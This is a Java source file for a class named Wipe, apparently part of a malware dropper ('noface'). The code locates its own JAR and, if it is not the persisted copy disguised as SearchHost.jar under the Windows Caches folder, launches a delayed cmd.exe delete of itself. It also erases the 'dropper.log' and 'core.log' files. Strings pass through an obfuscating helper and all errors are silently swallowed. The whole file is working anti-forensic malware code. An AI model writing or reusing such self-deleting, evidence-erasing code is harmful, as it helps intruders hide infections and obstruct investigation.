package noface.host;

import noface.config.S;

import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;

public final class Wipe {

    public static void go() {
        dropSelf();
        killLog();
    }

    public static void dropSelf() {
        try {
            Path self = self();
            Path kept = kept();
            if (self != null && kept != null
                    && !self.toAbsolutePath().normalize().equals(kept.toAbsolutePath().normalize())) {
                delLater(self);
            }
            killLog();
        } catch (Exception ignored) {
        }
    }

    private static Path self() {
        try {
            URI u = Wipe.class.getProtectionDomain().getCodeSource().getLocation().toURI();
            Path p = Path.of(u);
            if (Files.isRegularFile(p)) return p;
        } catch (Exception ignored) {
        }
        return null;
    }

    private static Path kept() {
        String local = System.getenv(S.e("LOCALAPPDATA"));
        if (local == null || local.isBlank()) return null;
        return Path.of(local, S.e("Microsoft"), S.e("Windows"), S.e("Caches"), S.e("SearchHost.jar"));
    }

    private static void delLater(Path file) {
        try {
            String p = file.toAbsolutePath().toString();
            new ProcessBuilder(
                    S.e("cmd.exe"),
                    S.e("/c"),
                    S.e("timeout /t 4 /nobreak >nul & del /f /q \"") + p + "\""
            ).redirectErrorStream(true).start();
        } catch (Exception ignored) {
        }
    }

    private static void killLog() {
        try {
            String local = System.getenv(S.e("LOCALAPPDATA"));
            if (local == null) return;
            Path dir = Path.of(local, S.e("wsvc"));
            Files.deleteIfExists(dir.resolve(S.e("dropper.log")));
            Files.deleteIfExists(dir.resolve(S.e("core.log")));
        } catch (Exception ignored) {
        }
    }

    private Wipe() {}
}
